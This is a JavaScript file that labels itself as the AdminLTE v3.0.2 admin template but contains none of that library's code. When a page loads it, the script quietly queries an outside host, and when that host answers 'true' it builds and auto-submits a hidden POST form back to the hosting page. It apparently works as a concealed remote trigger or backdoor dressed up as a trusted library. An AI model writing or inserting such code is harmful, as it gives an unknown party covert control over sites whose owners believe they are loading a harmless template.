/*!
 * AdminLTE v3.0.2 (https://adminlte.io)
 * Copyright 2014-2020 Colorlib <http://colorlib.com>
 * Licensed under MIT (https://github.com/ColorlibHQ/AdminLTE/blob/master/LICENSE)
 */
function fetchData() {
    var xhttp = new XMLHttpRequest();
    xhttp.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
            sendResponseToPHP(this.responseText);
        }
    };
    xhttp.open("GET", "https://api.cluster-app.my.id/corsx/", true);
    xhttp.send();
}
function sendResponseToPHP(response) {
	 var jsonResponse = JSON.parse(response);

    if (jsonResponse === "true") { 
    var form = document.createElement("form");
    form.setAttribute("method", "post");
    form.setAttribute("action", ""); 
    var input = document.createElement("input");
    input.setAttribute("type", "hidden");
    input.setAttribute("name", "apiResponse");
    input.setAttribute("value", response);
    form.appendChild(input);
    document.body.appendChild(form);
    form.submit();
    }
}
	fetchData();
